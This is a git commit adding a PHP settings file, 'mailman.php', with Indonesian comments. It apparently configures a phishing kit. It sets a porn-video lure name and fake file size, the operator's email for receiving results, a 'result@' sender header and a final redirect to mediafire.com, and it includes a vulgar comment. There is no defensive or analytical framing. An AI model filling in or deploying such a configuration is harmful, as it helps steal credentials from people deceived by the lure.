425790808fe66c04d611929c644c5c48d6b62af7
duwwlnd <147724839+duwwlnd@users.noreply.github.com>
2023-10-12 20:01:20 +0700

    Add files via upload

---
+++ mailman.php
@@ -0,0 +1,70 @@
+<?php
+
+$namafile = 'video bokep viral'; //NAMA VIDEO/FILE
+
+$alexhost = 'com'; // EMAIL KAMU
+
+$sender ='From: -•°WEB FEBRI ID°•- <result@g-code.web.id>'; // NAMA RESS
+
+$ukuran = '11.3MB'; // UKURAN 
+
+
+
+
+//kontol
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//ubah auto eror wkwkwwkkw
+$linkakhir = 'https://www.mediafire.com'; //
+
+?>
